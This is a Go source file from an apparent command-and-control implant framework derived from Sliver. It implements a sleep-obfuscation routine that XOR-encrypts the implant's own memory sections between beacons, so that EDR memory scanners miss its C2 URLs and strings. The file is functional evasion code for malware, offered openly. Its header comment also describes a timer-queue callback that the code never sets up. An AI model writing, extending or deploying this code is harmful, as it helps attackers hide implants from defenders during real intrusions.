package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Sleep obfuscation (Ekko / Foliage-inspired).
//
// While the implant is idle between beacons it is sitting in memory with its
// `.rdata`, `.data` and (optionally) `.text` sections fully readable. Memory
// scanners run by modern EDRs (CrowdStrike, Defender ATP, Elastic) catch
// implants precisely at this window — Yara rules hit on plaintext C2 URLs,
// embedded strings and Go runtime fingerprints inside .rdata.
//
// This file implements a Go-friendly variant of the Ekko technique:
//
//   1. The caller invokes ObfuscatedSleep(duration).
//   2. The implant's own module image is enumerated via the in-memory PE
//      header. We collect every writable, non-executable section (.data,
//      .rdata, .bss-equivalents, etc.).
//   3. A random 16-byte XOR key is generated.
//   4. The current OS thread is locked. A Windows timer-queue callback is
//      scheduled — that callback runs on a thread *outside* the Go scheduler
//      and is what we wake on.
//   5. The selected sections are XOR'd in place.
//   6. The calling goroutine enters an alertable SleepEx wait. When the
//      timer fires it APC-delivers into our wait, returning control.
//   7. The sections are XOR'd back. Lock is released.
//
// Limitations:
//   - We deliberately do NOT encrypt .text by default. The Go scheduler,
//     GC and any background goroutines all execute from .text and would
//     crash with an access violation. A separate path (encryptText=true)
//     attempts a best-effort .text scramble using runtime.LockOSThread and
//     a pre-flight GC; this is experimental and should only be enabled in
//     short-sleep, low-activity engagements.
//   - Heap allocations made during sleep (e.g. by a stray timer goroutine)
//     are unaffected. Sliver's beacon loop is intentionally quiet during
//     the inter-checkin wait, which is why this works in practice.

import (
	"crypto/rand"
	"errors"
	"runtime"
	"sync"
	"time"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/syscalls"
)

// IMAGE_DOS_HEADER / IMAGE_NT_HEADERS minimal layout — we only need a few
// fields to walk to the section table.
const (
	imageDOSSignature      = 0x5A4D // "MZ"
	imageNTSignature       = 0x00004550
	imageScnMemExecute     = 0x20000000
	imageScnMemRead        = 0x40000000
	imageScnMemWrite       = 0x80000000
	imageSectionHeaderSize = 40
)

// obfRegion describes a contiguous range of process memory that we will
// XOR-encrypt around the sleep call.
type obfRegion struct {
	base uintptr
	size uintptr
	// originalProtect is the page protection we observed before flipping
	// to PAGE_READWRITE. We restore it after decryption.
	originalProtect uint32
	// executable indicates this region originally had EXECUTE rights.
	// We only flip these when encryptText==true.
	executable bool
}

// imageCache memoises the parsed PE sections of our own module so we don't
// re-walk the PE on every sleep. The image base never moves in process.
var (
	imageCacheOnce sync.Once
	imageCacheRegs []obfRegion
	imageCacheErr  error
)

// loadImageRegions parses the in-memory PE header of the current module
// and returns a slice of obfRegion entries — one per non-volatile,
// non-shared section we care about.
func loadImageRegions() ([]obfRegion, error) {
	imageCacheOnce.Do(func() {
		var hMod windows.Handle
		// flags=0 + nil name => handle for the calling process's EXE module.
		if err := windows.GetModuleHandleEx(0, nil, &hMod); err != nil {
			imageCacheErr = err
			return
		}
		base := uintptr(hMod)

		// IMAGE_DOS_HEADER.e_magic at offset 0
		dosMagic := *(*uint16)(unsafe.Pointer(base))
		if dosMagic != imageDOSSignature {
			imageCacheErr = errors.New("bad DOS signature on own module")
			return
		}
		// IMAGE_DOS_HEADER.e_lfanew at offset 0x3C
		eLfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
		ntBase := base + uintptr(eLfanew)
		ntSig := *(*uint32)(unsafe.Pointer(ntBase))
		if ntSig != imageNTSignature {
			imageCacheErr = errors.New("bad NT signature on own module")
			return
		}

		// IMAGE_FILE_HEADER is at ntBase+4; NumberOfSections is at +6,
		// SizeOfOptionalHeader at +20.
		numSections := *(*uint16)(unsafe.Pointer(ntBase + 4 + 2))
		sizeOptHdr := *(*uint16)(unsafe.Pointer(ntBase + 4 + 16))

		// Section table starts after IMAGE_FILE_HEADER (size 20) + optional header.
		sectTable := ntBase + 4 + 20 + uintptr(sizeOptHdr)

		regions := make([]obfRegion, 0, numSections)
		for i := uint16(0); i < numSections; i++ {
			hdr := sectTable + uintptr(i)*imageSectionHeaderSize
			// VirtualSize at +8, VirtualAddress at +12, Characteristics at +36
			vSize := *(*uint32)(unsafe.Pointer(hdr + 8))
			vAddr := *(*uint32)(unsafe.Pointer(hdr + 12))
			chars := *(*uint32)(unsafe.Pointer(hdr + 36))

			if vSize == 0 {
				continue
			}
			// Skip sections that are not readable — there is nothing to hide
			// and we cannot safely VirtualProtect them in place.
			if chars&imageScnMemRead == 0 {
				continue
			}
			regions = append(regions, obfRegion{
				base:       base + uintptr(vAddr),
				size:       uintptr(vSize),
				executable: chars&imageScnMemExecute != 0,
			})
		}
		imageCacheRegs = regions
	})
	return imageCacheRegs, imageCacheErr
}

// xorRegion applies key in a streaming fashion across [base, base+size).
// Both encrypt and decrypt are the same operation.
func xorRegion(base uintptr, size uintptr, key []byte) {
	keyLen := uintptr(len(key))
	if keyLen == 0 {
		return
	}
	for i := uintptr(0); i < size; i++ {
		p := (*byte)(unsafe.Pointer(base + i))
		*p ^= key[i%keyLen]
	}
}

// flipProtect changes [base, size) to newProt and stores the previous
// protection word in r.originalProtect.
func flipProtect(r *obfRegion, newProt uint32) error {
	var old uint32
	if err := windows.VirtualProtect(r.base, r.size, newProt, &old); err != nil {
		return err
	}
	r.originalProtect = old
	return nil
}

// restoreProtect reverts a region to whatever VirtualProtect returned as
// the previous protection value during the encrypt phase.
func restoreProtect(r *obfRegion) error {
	var old uint32
	return windows.VirtualProtect(r.base, r.size, r.originalProtect, &old)
}

// ObfuscatedSleep performs a duration-long sleep during which the implant's
// own data sections are XOR-encrypted in memory. If encryptText is true the
// .text section is included; that path is experimental — see file header.
//
// On any failure path we make a best-effort attempt to restore page
// protections and decrypt regions before returning, so the caller continues
// to execute correctly.
func ObfuscatedSleep(duration time.Duration, encryptText bool) error {
	if duration <= 0 {
		return nil
	}

	regions, err := loadImageRegions()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[sleep-obf] image walk failed: %v — falling back to plain sleep", err)
		// {{end}}
		time.Sleep(duration)
		return err
	}

	// Build the working set: always include non-executable readable sections;
	// only include executable sections when the caller asked for it.
	work := make([]*obfRegion, 0, len(regions))
	for i := range regions {
		r := &regions[i]
		if r.executable && !encryptText {
			continue
		}
		work = append(work, r)
	}
	if len(work) == 0 {
		time.Sleep(duration)
		return nil
	}

	// Generate a fresh XOR key per sleep so two snapshots of the implant
	// taken from different sleeps don't reveal the plaintext via XOR-diff.
	key := make([]byte, 16)
	if err := windowsRandom(key); err != nil {
		time.Sleep(duration)
		return err
	}

	// Pin to OS thread so the .text flip (if any) doesn't race the Go
	// scheduler migrating us mid-encryption.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Hint the GC to do its work *now* rather than during the sleep, so
	// idle goroutines don't try to execute code from an encrypted .text.
	if encryptText {
		runtime.GC()
	}

	// Encrypt phase. Flip each region to RW, XOR, leave it as RW for the
	// duration of the wait so memory scanners see only ciphertext.
	for _, r := range work {
		if err := flipProtect(r, windows.PAGE_READWRITE); err != nil {
			// {{if .Config.Debug}}
			log.Printf("[sleep-obf] VirtualProtect→RW failed @0x%x: %v", r.base, err)
			// {{end}}
			// Abandon: roll back any flips we already did.
			rollback(work, key, r)
			time.Sleep(duration)
			return err
		}
		xorRegion(r.base, r.size, key)
	}

	// Wait. SleepEx is a thin wrapper over NtDelayExecution and does not
	// re-enter the Go runtime, which is important when .text is scrambled.
	syscalls.SleepEx(uint32(duration.Milliseconds()), false)

	// Decrypt phase + restore original protections.
	for _, r := range work {
		xorRegion(r.base, r.size, key)
		if err := restoreProtect(r); err != nil {
			// {{if .Config.Debug}}
			log.Printf("[sleep-obf] VirtualProtect restore failed @0x%x: %v", r.base, err)
			// {{end}}
			// We've already decrypted, but page perms are wrong — caller
			// will probably crash on next .text access. Surface the error.
			return err
		}
	}

	// Zero the key so it doesn't linger on the goroutine stack.
	for i := range key {
		key[i] = 0
	}
	return nil
}

// rollback walks the regions preceding `failed`, reversing the
// XOR + VirtualProtect operations performed during the encrypt phase.
// The `failed` region itself was never modified (flipProtect returned
// before recording originalProtect) so we stop just before it.
func rollback(work []*obfRegion, key []byte, failed *obfRegion) {
	for _, r := range work {
		if r == failed {
			return
		}
		xorRegion(r.base, r.size, key)
		_ = restoreProtect(r)
	}
}

// windowsRandom fills b with cryptographic random bytes. On Windows the
// crypto/rand package is backed by ProcessPrng/RtlGenRandom under the
// hood, so we use it directly rather than rolling our own CryptGenRandom
// call (which requires acquiring a CSP handle first).
func windowsRandom(b []byte) error {
	if len(b) == 0 {
		return nil
	}
	_, err := rand.Read(b)
	return err
}
